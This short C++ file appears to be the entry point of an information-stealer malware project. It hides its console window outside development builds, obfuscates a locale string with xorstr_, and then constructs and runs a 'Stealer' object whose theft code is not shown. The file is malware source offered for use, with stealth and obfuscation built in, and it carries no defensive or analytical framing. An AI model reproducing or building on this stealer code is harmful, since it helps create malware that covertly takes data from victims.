#include "stealer/Stealer.h"
#include <locale>

int main() {
    #if !DEV
        HWND hWnd = GetConsoleWindow();
        ShowWindow(hWnd, SW_HIDE);
    #endif

    std::locale::global(std::locale(""));
    setlocale(LC_ALL, xorstr_("ru-RU"));

    Stealer stealer;
    stealer.run();
    stealer.complete();

    return 0;
}
